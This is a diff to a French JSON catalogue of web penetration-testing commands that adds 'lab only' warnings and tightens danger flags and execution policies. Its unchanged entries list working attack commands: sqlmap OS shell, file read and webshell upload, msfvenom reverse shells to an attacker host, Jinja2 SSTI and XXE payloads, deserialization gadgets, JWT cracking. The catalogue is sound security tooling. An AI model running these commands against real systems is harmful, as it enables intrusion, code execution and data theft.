@@ -36,14 +36,14 @@
       "command": "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
       "purpose": "Trouver des panneaux admin, fichiers de config, backups, APIs non documentées.",
       "expected_output": "Chemins accessibles avec code HTTP (200, 301, 403…)",
-      "risks": "Génère des milliers de requêtes — visible dans les logs. Peut déclencher un ban IP.",
+      "risks": "Génère des milliers de requêtes — visible dans les logs. Peut déclencher un ban IP — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "gobuster installé",
         "Wordlist disponible (/usr/share/wordlists/)"
       ],
       "tool_required": "gobuster",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -52,7 +52,8 @@
         "web",
         "fuzzing",
         "wordlist"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_003",
@@ -62,7 +63,7 @@
       "command": "sqlmap -u \"http://$TARGET/page?id=1\" --dbs --batch",
       "purpose": "Identifier les bases de données accessibles via injection SQL. Extraction de données.",
       "expected_output": "Bases de données listées, tables, colonnes. Données extraites si vulnérable.",
-      "risks": "Requêtes massives sur la cible. Peut corrompre des données avec --level élevé.",
+      "risks": "Requêtes massives sur la cible. Peut corrompre des données avec --level élevé — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "sqlmap installé",
         "URL avec paramètre injectable identifié"
@@ -78,7 +79,8 @@
         "injection",
         "database",
         "web"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_004",
@@ -216,13 +218,13 @@
       "command": "searchsploit $SERVICE $VERSION",
       "purpose": "Trouver des exploits publics pour un service identifié (ex: Apache 2.4.49, vsftpd 2.3.4).",
       "expected_output": "Liste d'exploits disponibles avec leur chemin local EDB-ID",
-      "risks": "Lecture seule — aucun risque. Nécessite searchsploit à jour (--update).",
+      "risks": "Lecture seule — aucun risque. Nécessite searchsploit à jour (--update) — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "exploitdb installé (apt install exploitdb)",
         "Base à jour"
       ],
       "tool_required": "searchsploit",
-      "safe_to_run": true,
+      "safe_to_run": false,
       "dangerous": false,
       "requires_sudo": false,
       "category": "web_attack",
@@ -232,7 +234,8 @@
         "exploit",
         "cve",
         "web"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_010",
@@ -268,14 +271,14 @@
       "command": "nuclei -u http://$TARGET -severity low,medium,high,critical",
       "purpose": "Exécuter un balayage rapide de détections connues: exposures, CVE, panneaux admin, erreurs de configuration, prises d'empreinte.",
       "expected_output": "Liste des findings avec template ID, sévérité et URL concernée",
-      "risks": "Peut générer beaucoup de requêtes et être détecté. Certains templates sont intrusifs selon leur catégorie.",
+      "risks": "Peut générer beaucoup de requêtes et être détecté. Certains templates sont intrusifs selon leur catégorie — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nuclei installé",
         "templates Nuclei à jour"
       ],
       "tool_required": "nuclei",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -284,7 +287,8 @@
         "cve",
         "web",
         "scan"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_012",
@@ -294,14 +298,14 @@
       "command": "dirsearch -u http://$TARGET -e php,txt,zip,bak -w /usr/share/wordlists/dirb/common.txt",
       "purpose": "Trouver rapidement des backups, endpoints oubliés, consoles d'administration et fichiers exposés.",
       "expected_output": "Chemins trouvés avec code HTTP, taille, type de ressource",
-      "risks": "Bruyant: nombreuses requêtes HTTP. Peut déclencher une protection WAF ou du rate limiting.",
+      "risks": "Bruyant: nombreuses requêtes HTTP. Peut déclencher une protection WAF ou du rate limiting — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "dirsearch installé",
         "Wordlist disponible"
       ],
       "tool_required": "dirsearch",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -310,7 +314,8 @@
         "content-discovery",
         "web",
         "backup"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_013",
@@ -320,13 +325,13 @@
       "command": "paramspider -d $DOMAIN",
       "purpose": "Trouver rapidement des paramètres GET à tester pour XSS, IDOR, SQLi ou LFI à partir d'archives publiques.",
       "expected_output": "URLs avec paramètres sauvegardées dans le dossier output de ParamSpider",
-      "risks": "Faible risque direct, mais dépend d'archives externes et peut générer du bruit réseau si rejoué ensuite.",
+      "risks": "Faible risque direct, mais dépend d'archives externes et peut générer du bruit réseau si rejoué ensuite — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "paramspider installé"
       ],
       "tool_required": "paramspider",
-      "safe_to_run": true,
-      "dangerous": false,
+      "safe_to_run": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -335,7 +340,8 @@
         "xss",
         "sqli",
         "web"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_014",
@@ -370,13 +376,13 @@
       "command": "gau $DOMAIN | tee gau_$DOMAIN.txt",
       "purpose": "Collecter rapidement des endpoints historiques à rejouer ensuite avec httpx, gf, dalfox ou d'autres outils de tri.",
       "expected_output": "Liste d'URLs historiques sauvegardées dans gau_domain.txt",
-      "risks": "Faible risque direct. Les URLs récupérées peuvent toutefois cibler des surfaces sensibles si elles sont rejouées ensuite.",
+      "risks": "Faible risque direct. Les URLs récupérées peuvent toutefois cibler des surfaces sensibles si elles sont rejouées ensuite — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "gau installé"
       ],
       "tool_required": "gau",
-      "safe_to_run": true,
-      "dangerous": false,
+      "safe_to_run": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -385,7 +391,8 @@
         "history",
         "bugbounty",
         "web"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_016",
@@ -402,7 +409,7 @@
       ],
       "tool_required": "dalfox",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "execution_policy": "dry_run_only",
       "category": "web_attack",
@@ -526,7 +533,7 @@
       "command": "sqlmap -u 'http://$TARGET/page?id=1' --os-shell --batch --random-agent",
       "purpose": "Escalader une injection SQL en exécution de commandes OS",
       "expected_output": "os-shell> — prompt shell sur le serveur web",
-      "risks": "Critique — RCE sur le serveur web, traces dans les logs",
+      "risks": "Critique — RCE sur le serveur web, traces dans les logs — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "injection SQL confirmée",
         "DBMS avec stacked queries"
@@ -542,7 +549,7 @@
         "sqlmap",
         "os-shell"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_022",
@@ -552,7 +559,7 @@
       "command": "sqlmap -u 'http://$TARGET/page?id=1' --file-read=/etc/passwd --batch",
       "purpose": "Exfiltrer des fichiers sensibles via injection SQL",
       "expected_output": "Content of /etc/passwd saved to ...",
-      "risks": "Élevé — exfiltration de fichiers système",
+      "risks": "Élevé — exfiltration de fichiers système — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "injection SQL confirmée",
         "privilèges FILE sur DBMS"
@@ -568,7 +575,7 @@
         "sqlmap",
         "lfi"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_023",
@@ -578,7 +585,7 @@
       "command": "sqlmap -u 'http://$TARGET/page?id=1' --file-write=shell.php --file-dest=/var/www/html/shell.php --batch",
       "purpose": "Déposer un webshell persistant via injection SQL",
       "expected_output": "File written — accès via http://$TARGET/shell.php",
-      "risks": "Critique — RCE persistant via webshell",
+      "risks": "Critique — RCE persistant via webshell — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "injection SQL confirmée",
         "privilèges FILE",
@@ -595,7 +602,7 @@
         "persistence",
         "sqlmap"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_024",
@@ -605,7 +612,7 @@
       "command": "commix --url='http://$TARGET/page?cmd=test' --os-shell",
       "purpose": "Automatiser l'exploitation des injections de commande",
       "expected_output": "commix(os_shell)> — prompt shell interactif",
-      "risks": "Critique — RCE directe sur le serveur",
+      "risks": "Critique — RCE directe sur le serveur — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "commix installé",
         "paramètre injectable identifié"
@@ -621,7 +628,7 @@
         "commix",
         "os-injection"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_025",
@@ -631,7 +638,7 @@
       "command": "python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt",
       "purpose": "Récupérer la clé secrète JWT pour forger des tokens arbitraires",
       "expected_output": "[+] SECRET KEY FOUND: password123",
-      "risks": "Élevé — forgé token = bypass auth complet",
+      "risks": "Élevé — forgé token = bypass auth complet — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "jwt_tool installé",
         "token JWT HS256 capturé"
@@ -647,7 +654,7 @@
         "crack",
         "web"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_026",
@@ -657,7 +664,7 @@
       "command": "nuclei -u http://$TARGET -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml",
       "purpose": "Détecter Log4Shell sur des applications Java",
       "expected_output": "[critical] CVE-2021-44228 found at http://TARGET",
-      "risks": "Critique — CVE critique, RCE sans auth",
+      "risks": "Critique — CVE critique, RCE sans auth — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nuclei installé",
         "templates nuclei à jour"
@@ -673,7 +680,7 @@
         "rce",
         "cve-2021"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_027",
@@ -683,7 +690,7 @@
       "command": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u 'http://$TARGET/page?file=FUZZ' -mc 200 -fs 0",
       "purpose": "Découvrir une vulnérabilité LFI pour lire des fichiers serveur",
       "expected_output": "[Status: 200] /etc/passwd trouvé",
-      "risks": "Élevé — lecture de fichiers sensibles (clés SSH, configs)",
+      "risks": "Élevé — lecture de fichiers sensibles (clés SSH, configs) — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "ffuf installé",
         "SecLists installé"
@@ -699,7 +706,7 @@
         "file-read",
         "bruteforce"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_028",
@@ -709,7 +716,7 @@
       "command": "ffuf -w /tmp/ports.txt -u 'http://$TARGET/fetch?url=http://127.0.0.1:FUZZ' -mc 200 -fs 0",
       "purpose": "Pivoter vers le réseau interne via une vulnérabilité SSRF",
       "expected_output": "[Status: 200] Port 8080 accessible",
-      "risks": "Élevé — accès réseau interne via pivot applicatif",
+      "risks": "Élevé — accès réseau interne via pivot applicatif — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "ffuf installé",
         "SSRF confirmée",
@@ -726,7 +733,7 @@
         "web",
         "ffuf"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_029",
@@ -762,7 +769,7 @@
       "command": "msfvenom -p php/reverse_tcp LHOST=$ATTACKER LPORT=$PORT -f raw -o shell.php",
       "purpose": "Créer un webshell PHP pour obtenir un reverse shell après upload",
       "expected_output": "shell.php généré — à uploader sur le serveur cible",
-      "risks": "Critique — webshell persistant sur le serveur",
+      "risks": "Critique — webshell persistant sur le serveur — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "metasploit installé"
       ],
@@ -777,7 +784,7 @@
         "reverse-shell",
         "rce"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_031",
@@ -787,7 +794,7 @@
       "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=$PORT -f asp -o shell.asp",
       "purpose": "Créer un webshell ASP ciblant des serveurs IIS",
       "expected_output": "shell.asp généré — à uploader sur IIS",
-      "risks": "Critique — shell Meterpreter persistant sur Windows IIS",
+      "risks": "Critique — shell Meterpreter persistant sur Windows IIS — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "metasploit installé"
       ],
@@ -802,7 +809,7 @@
         "msfvenom",
         "webshell"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_032",
@@ -812,14 +819,14 @@
       "command": "python3 xsstrike.py -u 'http://$TARGET/search?q=test' --crawl -t 10",
       "purpose": "Détecter et prouver des vulnérabilités XSS en contournant les WAF",
       "expected_output": "Payload: <img src=x onerror=alert(1)> — XSS confirmed",
-      "risks": "Moyen — peut déclencher des alertes WAF/IDS",
+      "risks": "Moyen — peut déclencher des alertes WAF/IDS — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "XSStrike installé",
         "paramètre cible identifié"
       ],
       "tool_required": "python3",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "xss",
@@ -828,7 +835,7 @@
         "xsstrike",
         "injection"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_033",
@@ -838,14 +845,14 @@
       "command": "curl -s -I -H 'Origin: https://evil.com' http://$TARGET/api/v1/users | grep -i 'access-control'",
       "purpose": "Identifier une misconfiguration CORS permettant vol de données",
       "expected_output": "Access-Control-Allow-Origin: https://evil.com",
-      "risks": "Moyen — test passif, mais révèle une CORS exploitable",
+      "risks": "Moyen — test passif, mais révèle une CORS exploitable — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "endpoint API identifié"
       ],
       "tool_required": "curl",
-      "safe_to_run": true,
-      "dangerous": false,
+      "safe_to_run": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "cors",
@@ -854,7 +861,7 @@
         "misconfiguration",
         "javascript"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_034",
@@ -864,14 +871,14 @@
       "command": "curl -s -X POST http://$TARGET/upload -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
       "purpose": "Exploiter une vulnérabilité XXE pour lire des fichiers système",
       "expected_output": "root:x:0:0:root:/root:/bin/bash dans la réponse",
-      "risks": "Élevé — lecture de fichiers arbitraires, possible SSRF",
+      "risks": "Élevé — lecture de fichiers arbitraires, possible SSRF — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "endpoint XML identifié"
       ],
       "tool_required": "curl",
       "safe_to_run": false,
-      "dangerous": true,
+      "dangerous": false,
       "requires_sudo": false,
       "tags": [
         "xxe",
@@ -880,7 +887,7 @@
         "web",
         "injection"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_035",
@@ -890,7 +897,7 @@
       "command": "sqlmap -u 'http://$TARGET/page?id=1' --dump-all --batch --threads=5 --random-agent",
       "purpose": "Exfiltrer l'intégralité des données via injection SQL",
       "expected_output": "Fichiers CSV dans ~/.local/share/sqlmap/output/",
-      "risks": "Critique — exfiltration massive de données, très visible",
+      "risks": "Critique — exfiltration massive de données, très visible — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "injection SQL confirmée"
       ],
@@ -905,7 +912,7 @@
         "sqlmap",
         "data"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_036",
@@ -915,14 +922,14 @@
       "command": "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,bak,zip -t 50 --depth 3",
       "purpose": "Découvrir des fichiers et répertoires cachés de façon récursive",
       "expected_output": "200 /admin/config.php, 200 /backup.zip",
-      "risks": "Moyen — génère un trafic important, visible dans les logs",
+      "risks": "Moyen — génère un trafic important, visible dans les logs — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "feroxbuster installé",
         "SecLists installé"
       ],
       "tool_required": "feroxbuster",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "dirbusting",
@@ -931,7 +938,7 @@
         "feroxbuster",
         "recon"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_037",
@@ -946,8 +953,8 @@
         "Burp Suite ou Caido lancé sur 8080"
       ],
       "tool_required": "curl",
-      "safe_to_run": true,
-      "dangerous": false,
+      "safe_to_run": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "burp",
@@ -956,7 +963,7 @@
         "web",
         "intercept"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_038",
@@ -966,7 +973,7 @@
       "command": "nuclei -u http://$TARGET -t /root/nuclei-templates/cves/ -severity critical -rate-limit 50",
       "purpose": "Détecter automatiquement les CVE critiques sur un service web",
       "expected_output": "[critical] CVE-2022-XXXX found at http://TARGET",
-      "risks": "Élevé — scan actif, peut déclencher des alertes IDS",
+      "risks": "Élevé — scan actif, peut déclencher des alertes IDS — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nuclei installé",
         "templates à jour avec nuclei -update-templates"
@@ -982,7 +989,7 @@
         "critical",
         "vuln"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_039",
@@ -1042,14 +1049,14 @@
       "command": "curl -s 'http://$TARGET/search?q={{7*7}}' | grep -E '49|{{7\\*7}}'",
       "purpose": "Confirmer rapidement si un paramètre est interprété par un moteur de template côté serveur.",
       "expected_output": "49 dans la réponse si le payload est évalué côté serveur",
-      "risks": "Faible à moyen — injection applicative non destructive mais visible dans les logs.",
+      "risks": "Faible à moyen — injection applicative non destructive mais visible dans les logs — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "paramètre HTTP candidat identifié"
       ],
       "tool_required": "curl",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "ssti",
@@ -1058,7 +1065,7 @@
         "twig",
         "web"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_042",
@@ -1085,7 +1092,7 @@
         "web",
         "lab"
       ],
-      "execution_policy": "lab_only"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_043",
@@ -1148,7 +1155,7 @@
       "command": "java -jar ysoserial-all.jar CommonsCollections1 'id' > /tmp/payload.ser",
       "purpose": "Préparer une preuve de concept de désérialisation Java avant envoi contrôlé vers une application vulnérable.",
       "expected_output": "/tmp/payload.ser généré",
-      "risks": "Critique si envoyé à une cible — peut exécuter une commande côté serveur.",
+      "risks": "Critique si envoyé à une cible — peut exécuter une commande côté serveur — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "Java installé",
         "ysoserial-all.jar disponible",
@@ -1175,7 +1182,7 @@
       "command": "phpggc Laravel/RCE1 system 'id' --urlencode",
       "purpose": "Produire un payload PHP serialized adapté à un framework/gadget chain identifié.",
       "expected_output": "Payload URL-encodé à injecter dans le paramètre vulnérable",
-      "risks": "Critique si injecté — exécution de commande côté serveur.",
+      "risks": "Critique si injecté — exécution de commande côté serveur — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "phpggc installé",
         "framework et gadget chain identifiés",
@@ -1202,7 +1209,7 @@
       "command": "curl -s -I 'http://$TARGET/oauth/authorize?client_id=$CLIENT_ID&response_type=code&redirect_uri=https://evil.example/callback&scope=openid'",
       "purpose": "Détecter une mauvaise validation de redirect_uri pouvant exposer des codes OAuth.",
       "expected_output": "302 Location: https://evil.example/callback?... indique une validation faible",
-      "risks": "Moyen — test de logique d'authentification, ne pas utiliser sur des comptes réels.",
+      "risks": "Moyen — test de logique d'authentification, ne pas utiliser sur des comptes réels — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "client_id OAuth de test",
@@ -1210,7 +1217,7 @@
       ],
       "tool_required": "curl",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "oauth",
@@ -1219,7 +1226,7 @@
         "auth",
         "web"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_048",
@@ -1229,7 +1236,7 @@
       "command": "dalfox url 'http://$TARGET/page?param=test' --skip-bav --worker 20",
       "purpose": "Tester rapidement une URL paramétrée contre des vecteurs XSS reflected et DOM avec validation automatisée.",
       "expected_output": "Findings XSS potentiels avec payload, paramètre et preuve de réflexion/exécution",
-      "risks": "Génère de nombreuses requêtes et payloads actifs. Peut déclencher WAF, alertes ou blocage IP.",
+      "risks": "Génère de nombreuses requêtes et payloads actifs. Peut déclencher WAF, alertes ou blocage IP — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "dalfox installé",
         "URL autorisée avec paramètres testables"
@@ -1246,7 +1253,7 @@
         "scanner",
         "payload"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_049",
@@ -1256,7 +1263,7 @@
       "command": "python3 xsstrike.py -u 'http://$TARGET/page?param=test' --crawl --skip",
       "purpose": "Détecter des XSS en tenant compte du contexte HTML/JS et du filtrage applicatif.",
       "expected_output": "Paramètres vulnérables, payloads proposés et contexte d'injection détecté",
-      "risks": "Crawl et payloads actifs sur l'application. Peut générer du bruit applicatif.",
+      "risks": "Crawl et payloads actifs sur l'application. Peut générer du bruit applicatif — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "XSStrike disponible",
         "Application web autorisée"
@@ -1273,7 +1280,7 @@
         "crawl",
         "payload"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "dry_run_only"
     },
     {
       "id": "web_050",
@@ -1300,7 +1307,7 @@
         "web",
         "template"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_051",
@@ -1326,7 +1333,7 @@
         "rce",
         "web"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_052",
@@ -1336,14 +1343,14 @@
       "command": "arjun -u http://$TARGET/endpoint -m GET,POST --stable -oT arjun_params.txt",
       "purpose": "Trouver des paramètres non documentés à tester ensuite pour XSS, IDOR, SQLi, SSRF ou logique métier.",
       "expected_output": "Liste de paramètres découverts et sauvegarde dans arjun_params.txt",
-      "risks": "Fuzzing HTTP bruyant pouvant déclencher rate-limit ou WAF.",
+      "risks": "Fuzzing HTTP bruyant pouvant déclencher rate-limit ou WAF — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "arjun installé",
         "Endpoint web autorisé"
       ],
       "tool_required": "arjun",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -1352,7 +1359,7 @@
         "fuzzing",
         "web"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_053",
@@ -1389,14 +1396,14 @@
       "command": "kr scan http://$TARGET -w routes.kite -A=apiroutes-210228",
       "purpose": "Découvrir routes API cachées à partir de wordlists kiterunner.",
       "expected_output": "Routes API valides avec status et longueur",
-      "risks": "Fuzzing actif potentiellement bruyant.",
+      "risks": "Fuzzing actif potentiellement bruyant — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "kiterunner installé",
         "Wordlist routes.kite disponible"
       ],
       "tool_required": "kr",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -1405,7 +1412,7 @@
         "routes",
         "web"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_055",
@@ -1467,7 +1474,7 @@
       "command": "python3 jwt_tool.py $TOKEN -M at",
       "purpose": "Tester algorithmes, claims et mauvaises configs JWT.",
       "expected_output": "Résultats modules JWT Tool",
-      "risks": "Peut tenter des attaques actives selon modules.",
+      "risks": "Peut tenter des attaques actives selon modules — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "jwt_tool disponible",
         "Token autorisé"
@@ -1483,7 +1490,7 @@
         "token",
         "auth"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_058",
@@ -1520,14 +1527,14 @@
       "command": "nuclei -u http://$TARGET -tags exposure,api,swagger,graphql",
       "purpose": "Détecter endpoints API exposés, Swagger, GraphQL et configs faibles.",
       "expected_output": "Findings nuclei filtrés par tags",
-      "risks": "Scan actif avec templates variés.",
+      "risks": "Scan actif avec templates variés — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nuclei installé",
         "templates à jour"
       ],
       "tool_required": "nuclei",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -1536,7 +1543,7 @@
         "swagger",
         "graphql"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "web_060",
@@ -1572,14 +1579,14 @@
       "command": "python3 corsy.py -u http://$TARGET",
       "purpose": "Identifier CORS permissif exploitable.",
       "expected_output": "Origines acceptées, credentials, verdict",
-      "risks": "Requêtes HTTP actives mais faibles.",
+      "risks": "Requêtes HTTP actives mais faibles — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "Corsy disponible",
         "Application autorisée"
       ],
       "tool_required": "python3",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "web_attack",
       "tags": [
@@ -1588,7 +1595,7 @@
         "web",
         "misconfig"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "name": "XSStrike — scanner XSS intelligent",
@@ -1605,7 +1612,7 @@
       "tool_required": "python3",
       "safe_to_run": false,
       "dangerous": true,
-      "execution_policy": "lab_only",
+      "execution_policy": "dry_run_only",
       "tags": [
         "web",
         "xss",
@@ -1624,7 +1631,7 @@
       "command": "dalfox url 'http://$TARGET/?search=test' --blind $CALLBACK_URL -o /tmp/dalfox.txt --format json",
       "purpose": "Détecter XSS réfléchi et blind XSS avec callback automatique.",
       "expected_output": "[POC] http://target.com/?search=<script src=//callback>",
-      "risks": "Envoie des payloads actifs avec callbacks — visible dans logs cibles.",
+      "risks": "Envoie des payloads actifs avec callbacks — visible dans logs cibles — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "dalfox (go install github.com/hahwul/dalfox/v2@latest)",
         "$CALLBACK_URL = serveur XSS hunter"
@@ -1632,7 +1639,7 @@
       "tool_required": "dalfox",
       "safe_to_run": false,
       "dangerous": true,
-      "execution_policy": "lab_only",
+      "execution_policy": "dry_run_only",
       "tags": [
         "web",
         "xss",
@@ -1651,13 +1658,13 @@
       "command": "arjun -u http://$TARGET/api/user -m GET,POST -o /tmp/arjun.json",
       "purpose": "Découvrir des paramètres cachés comme ?debug=true, ?admin=1, ?id= non documentés.",
       "expected_output": "Found: ['id', 'user_id', 'debug', 'token'] in GET",
-      "risks": "Génère de nombreuses requêtes variées — peut déclencher WAF ou rate limiting.",
+      "risks": "Génère de nombreuses requêtes variées — peut déclencher WAF ou rate limiting — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "arjun installé (pip install arjun)"
       ],
       "tool_required": "arjun",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "execution_policy": "lab_only",
       "tags": [
         "web",
@@ -1677,7 +1684,7 @@
       "command": "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404,403 -u http://$TARGET/FUZZ -t 30",
       "purpose": "Fuzzer endpoints, paramètres et valeurs pour trouver des comportements inattendus.",
       "expected_output": "200  http://target.com/admin, 200 http://target.com/api, 301 http://target.com/backup",
-      "risks": "Génère beaucoup de requêtes — peut saturer l'app ou déclencher des alertes.",
+      "risks": "Génère beaucoup de requêtes — peut saturer l'app ou déclencher des alertes — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "wfuzz installé (pip install wfuzz)"
       ],
@@ -1710,7 +1717,7 @@
       "tool_required": "curl",
       "safe_to_run": false,
       "dangerous": true,
-      "execution_policy": "lab_only",
+      "execution_policy": "dry_run_only",
       "tags": [
         "web",
         "ssti",
@@ -1729,7 +1736,7 @@
       "command": "curl -s 'http://$TARGET/?name={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'",
       "purpose": "Transformer une injection de template Jinja2 en exécution de commande arbitraire sur Flask.",
       "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
-      "risks": "EXÉCUTION DE CODE ARBITRAIRE — ne jamais utiliser sans autorisation écrite.",
+      "risks": "EXÉCUTION DE CODE ARBITRAIRE — ne jamais utiliser sans autorisation écrite — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "cible vulnérable SSTI Jinja2 confirmée",
         "curl installé"
@@ -1810,7 +1817,7 @@
       "command": "python3 jwt_tool.py $TOKEN -M at -p /usr/share/wordlists/rockyou.txt",
       "purpose": "Tester toutes les attaques JWT : none alg, key confusion RS→HS, crack HMAC, injection claims.",
       "expected_output": "Secret found: 'secret123' — ou alg confusion détectée",
-      "risks": "Requiert token valide capturé. Crack permet de forger des tokens admin.",
+      "risks": "Requiert token valide capturé. Crack permet de forger des tokens admin — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "jwt_tool (git clone https://github.com/ticarpi/jwt_tool)",
         "$TOKEN = token JWT capturé"
@@ -1818,7 +1825,7 @@
       "tool_required": "python3",
       "safe_to_run": false,
